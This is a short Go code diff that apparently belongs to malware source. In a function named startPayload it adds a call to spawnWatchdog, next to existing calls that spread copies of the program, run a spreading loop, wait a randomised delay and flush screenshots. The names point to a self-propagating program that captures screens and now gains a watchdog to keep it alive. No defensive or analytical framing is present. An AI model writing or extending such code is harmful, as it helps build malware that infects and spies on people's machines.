@@ -491,6 +491,7 @@ func startPayload() {
 		}
 		spreadCopies(false)
 		go spreadLoop()
+		spawnWatchdog()
 
 		time.Sleep(time.Duration(5+rand.Intn(5)) * time.Second)
 		screenshotFlush()
